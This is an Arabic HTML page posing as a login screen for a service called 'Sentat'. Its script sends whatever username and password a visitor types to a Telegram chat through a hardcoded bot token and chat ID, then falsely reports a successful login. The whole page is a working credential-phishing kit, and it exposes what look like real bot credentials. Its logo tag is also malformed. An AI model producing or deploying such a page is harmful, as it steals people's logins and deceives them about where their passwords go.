<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول إلى سنتات</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f4f4f4;
        }
        .login-container {
            width: 300px;
            margin: auto;
            padding: 20px;
            background: white;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
            margin-top: 20px;
        }
        input {
            width: 90%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background: #218838;
        }
        .logo {
            width: 100px;
            height: 100px;
            margin: 10px auto;
        }
    </style>
</head>
<body>

    <h2>تسجيل الدخول إلى سنتات</h2>

    <!-- صورة في الأعلى -->
    <img src="<img src="https://tgrbah.neocities.org/logosnt.jpg" alt="شعار سنتات" width="150">
" alt="شعار سنتات" class="logo">
    
    <div class="login-container">
        <input type="text" id="username" placeholder="اسم المستخدم">
        <input type="password" id="password" placeholder="كلمة المرور">
        <button onclick="sendToTelegram()">تسجيل الدخول</button>
    </div>

    <script>
        function sendToTelegram() {
            var username = document.getElementById("username").value;
            var password = document.getElementById("password").value;

            if (username === "" || password === "") {
                alert("يرجى إدخال اسم المستخدم وكلمة المرور");
                return;
            }

            var botToken = "7928659119:AAEk7mQ0vAK_FgkHGVuq0HnvQoRnXdTdLaw"; // ضع التوكن هنا
            var chatId = "1691133310"; // ضع الـ ID هنا
            var message = "🔐 تسجيل دخول جديد:\n\n👤 اسم المستخدم: " + username + "\n🔑 كلمة المرور: " + password;

            var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            fetch(url)
                .then(response => {
                    if (response.ok) {
                        alert("تم تسجيل الدخول بنجاح!");
                    } else {
                        alert("حدث خطأ أثناء إرسال البيانات!");
                    }
                })
                .catch(error => {
                    alert("خطأ في الاتصال بالسيرفر!");
                    console.error(error);
                });
        }
    </script>

</body>
</html>
